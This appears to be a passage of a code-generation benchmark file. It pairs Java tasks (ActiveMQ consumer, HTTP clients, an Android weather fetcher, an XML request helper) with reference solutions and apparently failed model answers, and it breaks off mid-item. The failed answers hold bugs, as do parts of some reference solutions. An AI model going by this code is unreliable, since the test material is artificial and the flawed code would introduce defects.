[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message consumer capable of receiving messages from a specified queue, processing different message types (TextMessage and BytesMessage), and handling connection exceptions.\n\nClass Description: The ActiveMqConsumer class implements Runnable and ExceptionListener interfaces to asynchronously consume messages from an ActiveMQ broker while handling connection exceptions. It manages the JMS connection lifecycle and provides methods to start/stop the consumer.\n\nAttributes:\n- connection: Connection - JMS connection to the ActiveMQ broker\n- session: Session - JMS session for message processing\n- consumer: MessageConsumer - JMS message consumer for receiving messages\n- remoteUri: String - URI of the ActiveMQ broker\n- queueName: String - Name of the queue to consume messages from\n\nMethods:\n- ActiveMqConsumer(String remoteUri, String queueName) -> None - Constructor that initializes the broker URI and queue name\n- start() -> void - Creates connection factory, establishes connection, creates session and consumer\n- stop() -> void - Closes consumer, session and connection resources\n- run() -> void - Continuously receives and processes messages (TextMessage/BytesMessage)\n- onException(JMSException e) -> void - Exception handler that stops the consumer on connection errors\n- getConnection() -> Connection - Returns the JMS connection\n- getSession() -> Session - Returns the JMS session\n- getConsumer() -> MessageConsumer - Returns the message consumer",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Connection;\nimport javax.jms.Destination;\nimport javax.jms.ExceptionListener;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport com.sitewhere.spi.SiteWhereException;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws SiteWhereException {\n        try {\n            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n            this.connection = connectionFactory.createConnection();\n            this.connection.setExceptionListener(this);\n            this.connection.start();\n            this.session = this.connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = this.session.createQueue(queueName);\n            this.consumer = this.session.createConsumer(destination);\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error starting ActiveMQ consumer.\", e);\n        }\n    }\n\n    public void stop() throws SiteWhereException {\n        try {\n            this.consumer.close();\n            this.session.close();\n            this.connection.close();\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error shutting down ActiveMQ consumer.\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    break;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    byte[] payload = textMessage.getText().getBytes();\n                    // Process payload here\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMessage.getBodyLength()];\n                    // Process buffer here\n                }\n            } catch (Throwable e) {\n                return;\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        try {\n            stop();\n        } catch (SiteWhereException e1) {\n        }\n    }\n\n    protected Connection getConnection() {\n        return connection;\n    }\n\n    protected Session getSession() {\n        return session;\n    }\n\n    protected MessageConsumer getConsumer() {\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "wrong_result": "import javax.jms.*;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n    private String remoteUri;\n    private String queueName;\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private boolean running = true;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() {\n        try {\n            ConnectionFactory factory = new ActiveMQConnectionFactory(remoteUri);\n            connection = factory.createConnection();\n            connection.setExceptionListener(this);\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            consumer = session.createConsumer(queueName);\n        } catch (JMSException e) {\n            onException(e);\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            if (consumer != null) consumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            // Handle exception if needed\n        }\n    }\n\n    @Override\n    public void run() {\n        while (running) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    continue;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    String text = textMessage.getText();\n                    // Process text message\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] bytes = new byte[(int) bytesMessage.getBodyLength()];\n                    bytesMessage.readBytes(bytes);\n                    // Process bytes message\n                }\n            } catch (JMSException e) {\n                // Handle exception, maybe log\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        stop();\n    }\n\n    public Connection getConnection() {\n        return connection;\n    }\n\n    public Session getSession() {\n        return session;\n    }\n\n    public MessageConsumer getConsumer() {\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests for sending debug information to a server, including handling redirects and SSL connections.\n\nClass Description: HttpDebugIdSender is a utility class designed to send debug information to a specified server URL using HTTP POST requests. It handles JSON payload construction, SSL connections (when needed), and follows redirects if necessary. The class includes error logging and proper resource cleanup.\n\nAttributes:\n- distinctId: String - Unique identifier for the debug session\n- infoId: String - Additional information ID to be included in the URL\n- serverUrl: String - Base URL of the server to which debug information will be sent\n\nMethods:\n- HttpDebugIdSender(String serverUrl, String distinctId, String infoId) -> None - Constructor that initializes the class with server URL, distinct ID, and info ID\n- send() -> None - Initiates the HTTP request to send debug information\n- sendHttpRequest(String serverUrl, boolean isRedirects) -> None - Internal method that handles the actual HTTP request, including connection setup, payload sending, and response handling\n- closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) -> None - Helper method to safely close all open streams and connections",
    "Canonical_solution": "import android.content.Context;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport com.sensorsdata.analytics.android.sdk.util.NetworkUtils;\nimport com.sensorsdata.analytics.android.sdk.util.TimeUtils;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpDebugIdSender {\n    private String distinctId;\n    private String infoId;\n    private String serverUrl;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n        this.serverUrl = serverUrl;\n    }\n\n    public void send() {\n        sendHttpRequest(serverUrl, false);\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) {\n        ByteArrayOutputStream out = null;\n        OutputStream out2 = null;\n        BufferedOutputStream bout = null;\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(String.format(serverUrl + \"&info_id=%s\", infoId));\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode URL:%s\", url), null);\n            connection = (HttpURLConnection) url.openConnection();\n            if (connection == null) {\n                SALog.info(\"HttpDebugIdSender\", String.format(\"can not connect %s,shouldn't happen\", url.toString()), null);\n                return;\n            }\n            SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n            if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                    && connection instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) connection).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n            }\n            connection.setInstanceFollowRedirects(false);\n            out = new ByteArrayOutputStream();\n            OutputStreamWriter writer = new OutputStreamWriter(out);\n            String requestBody = \"{\\\"distinct_id\\\": \\\"\" + distinctId + \"\\\"}\";\n            writer.write(requestBody);\n            writer.flush();\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode request body : %s\", requestBody), null);\n            connection.setDoOutput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-type\", \"text/plain\");\n\n            out2 = connection.getOutputStream();\n            bout = new BufferedOutputStream(out2);\n            bout.write(out.toString().getBytes(\"UTF-8\"));\n            bout.flush();\n            out.close();\n            int responseCode = connection.getResponseCode();\n            SALog.info(\"HttpDebugIdSender\", String.format(TimeUtils.SDK_LOCALE, \"DebugMode ResponseCode: %d\", responseCode), null);\n            if (!isRedirects && NetworkUtils.needRedirects(responseCode)) {\n                String location = NetworkUtils.getLocation(connection, serverUrl);\n                if (!TextUtils.isEmpty(location)) {\n                    closeStream(out, out2, bout, connection);\n                    sendHttpRequest(location, true);\n                }\n            }\n        } catch (Exception e) {\n            SALog.printStackTrace(e);\n        } finally {\n            closeStream(out, out2, bout, connection);\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        if (out != null) {\n            try {\n                out.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (out2 != null) {\n            try {\n                out2.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (bout != null) {\n            try {\n                bout.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpDebugIdSender {\n    private String serverUrl;\n    private String distinctId;\n    private String infoId;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.serverUrl = serverUrl;\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n    }\n\n    public void send() {\n        sendHttpRequest(serverUrl, true);\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) {\n        try {\n            String fullUrl = serverUrl + \"/\" + infoId;\n            URL url = new URL(fullUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setFollowRedirects(isRedirects);\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setDoOutput(true);\n\n            String jsonPayload = String.format(\"{\\\"distinctId\\\": \\\"%s\\\", \\\"infoId\\\": \\\"%s\\\"}\", distinctId, infoId);\n            OutputStream out = connection.getOutputStream();\n            BufferedOutputStream bout = new BufferedOutputStream(out);\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n            byte[] input = jsonPayload.getBytes(\"utf-8\");\n            bout.write(input, 0, input.length);\n            bout.flush();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 400) {\n                System.err.println(\"Server returned HTTP error code: \" + responseCode);\n            }\n\n            closeStream(baos, out, bout, connection);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        try {\n            if (out != null) out.close();\n            if (out2 != null) out2.close();\n            if (bout != null) bout.close();\n            if (connection != null) connection.disconnect();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Java HTTP client class that handles various types of HTTP requests, including multipart form data uploads, with support for proxy configuration and connection retries.\n\nClass Description: The HttpClient class provides functionality to make HTTP requests with configurable methods, headers, and request bodies. It supports both simple requests and multipart form data uploads, handles connection retries through a retry handler, and allows proxy configuration.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart requests (default \"--\")\n- boundary: String - Unique boundary string for multipart requests\n- handler: HttpConnectionRetryHandler - Handler for connection retry logic\n- proxyHost: String - Proxy host address\n- proxyPort: String - Proxy port number\n- me: HttpClient - Singleton instance reference\n\nMethods:\n- getInstance() -> HttpClient - Returns the singleton instance of HttpClient\n- connect(String method, Properties props) -> void - Establishes HTTP connection with given method and properties (throws HttpClientException)\n- doConnection(String method, Properties props) -> void - Internal method to create and configure HTTP connection (throws IOException)\n- downloadImage(String imgName) -> byte[] - Downloads an image by name and returns as byte array\n- connectForMultipart() -> void - Prepares connection for multipart form data upload (throws Exception)\n- addFormPart(String paramName, String value) -> void - Adds a form part to multipart request (throws Exception)\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file part to multipart request (throws Exception)\n- finishMultipart() -> void - Finalizes multipart request (throws Exception)\n- getResponse() -> String - Reads and returns server response (throws Exception)\n- writeParamData(String paramName, String value) -> void - Internal method to write form parameter data (throws Exception)\n- setUrl(String url) -> void - Sets the target URL\n- setProxy(String host, String port) -> void - Configures proxy settings",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Enumeration;\nimport java.util.Properties;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n    \n    private HttpConnectionRetryHandler handler;\n    \n    private String proxyHost;\n    private String proxyPort;\n    \n    private static HttpClient me;\n    \n    public static HttpClient getInstance() {\n        if (me == null)\n            me = new HttpClient();\n        \n        return me;\n    }\n\n    private HttpClient() { }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        boolean status  = true;\n        int attemptNumber = 0;\n        while (status) {\n            try {\n                attemptNumber++;\n                doConnection(method, props);\n                status = false;\n            }\n            catch(Throwable t) {\n                if (handler != null) {\n                    status = handler.shouldRetry(t, attemptNumber);\n                    if (!status)\n                        throw new HttpClientException(t);\n                }\n                else {                    \n                    throw new HttpClientException(t);\n                }\n            }\n        }\n    }\n    \n    private void doConnection(String method, Properties props) throws IOException {\n        if (proxyPort != null && proxyHost != null) {\n            Proxy p = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) ( new URL(url)).openConnection(p);\n        }\n        else\n            con = (HttpURLConnection) ( new URL(url)).openConnection();\n        \n        con.setRequestMethod(method);\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setConnectTimeout(5 * 1000);\n        \n        if (props != null) {\n            Enumeration keys = props.keys();\n            while (keys.hasMoreElements()) {\n                String key = (String) keys.nextElement();\n                String val = props.getProperty(key);\n                con.setRequestProperty(key, val);\n            }\n        }\n        \n        con.connect();\n    }\n\n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connect(\"Post\", null);\n            con.getOutputStream().write((\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while (is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        Properties props = new Properties();\n        props.setProperty(\"Connection\", \"Keep-Alive\");\n        props.setProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n\n        connect(\"POST\", props);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"Content-Type: application/octet-stream\\r\\n\").getBytes());\n        os.write((\"Content-Transfer-Encoding: binary\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n\n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while (is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n    \n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private static HttpClient instance;\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n    private HttpConnectionRetryHandler handler;\n    private String proxyHost;\n    private String proxyPort;\n    private HttpClient me;\n\n    public static HttpClient getInstance() {\n        if (instance == null) {\n            instance = new HttpClient();\n        }\n        return instance;\n    }\n\n    private HttpClient() {\n        this.boundary = \"boundary-\" + UUID.randomUUID().toString();\n        this.me = this;\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n\n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        try {\n            doConnection(method, props);\n        } catch (IOException e) {\n            throw new HttpClientException(\"Connection failed: \" + e.getMessage(), e);\n        }\n    }\n\n    private void doConnection(String method, Properties props) throws IOException {\n        URL url = new URL(this.url);\n        con = (HttpURLConnection) url.openConnection();\n\n        if (proxyHost != null && proxyPort != null) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) url.openConnection(proxy);\n        }\n\n        con.setRequestMethod(method);\n\n        if (props != null) {\n            for (Object key : props.keySet()) {\n                con.setRequestProperty((String) key, (String) props.get(key));\n            }\n        }\n\n        int retryCount = 0;\n        while (retryCount < handler.getMaxRetries()) {\n            try {\n                if (con.getResponseCode() >= 200 && con.getResponseCode() < 300) {\n                    break;\n                }\n                if (handler.retry(retryCount)) {\n                    retryCount++;\n                } else {\n                    throw new IOException(\"Max retries exceeded\");\n                }\n            } catch (IOException e) {\n                if (handler.retry(retryCount)) {\n                    retryCount++;\n                } else {\n                    throw e;\n                }\n            }\n        }\n\n        if (method.equals(\"POST\") || method.equals(\"PUT\")) {\n            con.setDoOutput(true);\n            os = con.getOutputStream();\n        }\n    }\n\n    public void connectForMultipart() throws Exception {\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write(delimiter.getBytes());\n        os.write(boundary.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\" + \"\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(value.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write(delimiter.getBytes());\n        os.write(boundary.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\" + \"\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\".getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write(delimiter.getBytes());\n        os.write(boundary.getBytes());\n        os.write(delimiter.getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws Exception {\n        StringBuilder response = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n            response.append(\"\\r\\n\");\n        }\n        reader.close();\n        return response.toString();\n    }\n\n    public byte[] downloadImage(String imgName) throws Exception {\n        connect(\"GET\", null);\n        try (InputStream is = con.getInputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            ByteArrayOutputStream output = new ByteArrayOutputStream();\n            while ((bytesRead = is.read(buffer)) != -1) {\n                output.write(buffer, 0, bytesRead);\n            }\n            return output.toByteArray();\n        }\n    }\n\n    public class HttpConnectionRetryHandler {\n        private int maxRetries = 3;\n\n        public boolean retry(int attempt) {\n            return attempt < maxRetries;\n        }\n\n        public int getMaxRetries() {\n            return maxRetries;\n        }\n    }\n\n    public static class HttpClientException extends Exception {\n        public HttpClientException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a Java class that asynchronously fetches weather data from a remote API using HTTP URL connection and processes the JSON response to extract sunrise and sunset times.\n\nClass Description: HttpWeatherClient is an Android utility class that performs asynchronous HTTP requests to fetch weather data and parse the JSON response. It uses AsyncTask to handle network operations off the main thread.\n\nAttributes: None (All variables are local to methods)\n\nMethods:\n1: WeatherAsyncTask(String... params) -> String - AsyncTask subclass that handles the background HTTP request. Takes URL string as input and returns null (results are processed via progress updates).\n2: onProgressUpdate(String... progress) -> void - Processes the JSON response to extract sunrise and sunset times from the astronomy data.\n3: convertStreamToString(InputStream inputStream) -> String - Helper method that converts an InputStream to a String for JSON parsing. Takes InputStream as input and returns the converted String.\n\nNote: All methods include basic exception handling with empty catch blocks as shown in the reference code. The class is designed for Android platform (uses android.os.AsyncTask).",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpWeatherClient {\n\n    public static class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String weatherData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    weatherData = convertStreamToString(in);\n                    publishProgress(weatherData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                JSONObject query = json.getJSONObject(\"query\");\n                JSONObject results = query.getJSONObject(\"results\");\n                JSONObject channel = results.getJSONObject(\"channel\");\n                JSONObject astronomy = channel.getJSONObject(\"astronomy\");\n                String sunset = astronomy.getString(\"sunset\");\n                String sunrise = astronomy.getString(\"sunrise\");\n            } catch (Exception ex) {}\n        }\n    }\n\n    private static String convertStreamToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String result = \"\";\n\n        try {\n            while ((line = reader.readLine()) != null) {\n                result += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpWeatherClient {\n    private static class WeatherAsyncTask extends android.os.AsyncTask<String, String, Void> {\n        @Override\n        protected Void doInBackground(String... params) {\n            String url = params[0];\n            try {\n                java.net.URL urlObject = new java.net.URL(url);\n                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) urlObject.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.connect();\n                java.io.InputStream inputStream = connection.getInputStream();\n                String json = convertStreamToString(inputStream);\n                publishProgress(json);\n            } catch (Exception e) {\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            String json = progress[0];\n            try {\n                org.json.JSONObject jsonObject = new org.json.JSONObject(json);\n                org.json.JSONObject astronomy = jsonObject.getJSONObject(\"astronomy\");\n                String sunrise = astronomy.getString(\"sunrise\");\n                String sunset = astronomy.getString(\"sunset\");\n            } catch (Exception e) {\n            }\n        }\n    }\n\n    private String convertStreamToString(java.io.InputStream inputStream) {\n        try {\n            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));\n            java.lang.StringBuilder stringBuilder = new java.lang.StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n            return stringBuilder.toString();\n        } catch (Exception e) {\n        }\n        return \"\";\n    }\n}"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs an HTTP/HTTPS request with XML data and parses the XML response into a key-value map.\n\nFunction Description: This function sends an HTTP/HTTPS request (GET/POST) to a specified URL with XML data as input, then parses the XML response into a Map<String, Object> where keys are XML element names and values are their text content. The function handles connection setup, request configuration, data transmission, response parsing, and resource cleanup.\n\nInput:\n- requestUrl: String - The target URL for the HTTP request\n- requestMethod: String - The HTTP method to use (e.g., \"GET\" or \"POST\")\n- xmlStr: String - The XML data to send with the request (can be null for GET requests)\n\nOutput:\n- Map<String, Object> - A map containing key-value pairs parsed from the XML response, where keys are XML element names and values are their text content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.HashMap;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic static Map<String, Object> httpXmlRequest(String requestUrl, String requestMethod, String xmlStr) {\n    Map<String, Object> map = new HashMap<String, Object>();\n    try {\n        HttpsURLConnection urlCon = (HttpsURLConnection) (new URL(requestUrl)).openConnection();\n        urlCon.setDoInput(true);\n        urlCon.setDoOutput(true);\n        urlCon.setRequestMethod(requestMethod);\n\n        if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            urlCon.connect();\n        }\n\n        urlCon.setRequestProperty(\"Content-Length\", String.valueOf(xmlStr.getBytes().length));\n        urlCon.setUseCaches(false);\n        if (null != xmlStr) {\n            OutputStream outputStream = urlCon.getOutputStream();\n            outputStream.write(xmlStr.getBytes(\"UTF-8\"));\n            outputStream.flush();\n            outputStream.close();\n        }\n        InputStream inputStream = urlCon.getInputStream();\n        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStreamReader);\n        Element root = document.getRootElement();\n        List<Element> elementList = root.elements();\n        for (Element e : elementList) {\n            map.put(e.getName(), e.getText());\n        }\n        inputStreamReader.close();\n        inputStream.close();\n        inputStream = null;\n        urlCon.disconnect();\n    } catch (MalformedURLException e) {\n        LOG.error(e.getMessage());\n    } catch (IOException e) {\n        LOG.error(e.getMessage());\n    } catch (Exception e) {\n        LOG.error(e.getMessage());\n    }\n    return map;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.HashMap;\nimport java.util.Map;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\nimport java.io.StringReader;\nimport java.io.IOException;\n\npublic class XmlHttpRequest {\n    public static Map<String, Object> sendXmlRequest(String requestUrl, String requestMethod, String xmlStr) throws IOException, Exception {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(requestUrl));\n        \n        if (\"POST\".equalsIgnoreCase(requestMethod)) {\n            if (xmlStr != null) {\n                requestBuilder = requestBuilder.header(\"Content-Type\", \"application/xml\")\n                        .POST(HttpRequest.BodyPublishers.ofString(xmlStr));\n            }\n        } else if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            // No body, no content-type\n        }\n        \n        HttpRequest request = requestBuilder.build();\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n        \n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(response.body())));\n        \n        Map<String, Object> result = new HashMap<>();\n        parseXmlElements(doc.getDocumentElement(), result);\n        \n        return result;\n    }\n    \n    private static void parseXmlElements(Element element, Map<String, Object> map) {\n        String tagName = element.getTagName();\n        String textContent = element.getTextContent().trim();\n        map.put(tagName, textContent);\n        \n        NodeList children = element.getChildNodes();\n        for (int i = 0; i < children.getLength(); i++) {\n            Node node = children.item(i);\n            if (node.getNodeType() == Node.ELEMENT_NODE) {\n                Element childElement = (Element) node;\n                parseXmlElements(childElement, map);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 105,
